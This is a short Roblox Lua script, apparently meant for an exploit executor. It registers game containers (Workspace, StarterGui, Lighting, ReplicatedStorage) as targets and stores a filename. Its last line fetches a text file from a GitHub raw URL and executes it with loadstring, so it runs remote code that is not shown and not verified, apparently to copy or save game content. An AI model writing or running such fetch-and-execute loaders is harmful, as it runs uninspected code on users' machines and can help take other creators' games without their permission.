local Nam = ""
if Nam == "" then
  error("you forgor to enter filename :skull:")
else
  local new = Instance.new("StringValue")
  new.Value = Nam
  new.Name = "OhioFileName"
  new.Parent = game.ReplicatedStorage
  local target = {game.Workspace,game.StarterGui,game.Lighting,game.ReplicatedStorage}
  local newFol = Instance.new("Folder")
  newFol.Name = "OhioTargetFolder"
  for _,v in pairs(target) do
    local new2 = Instance.new("ObjectValue")
    new2.Value = v
    new2.Parent = newFol
  end
  newFol.Parent = game.ReplicatedStorage
  
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Level5Gyatt/broobruh/main/v24.txt',true))()
end
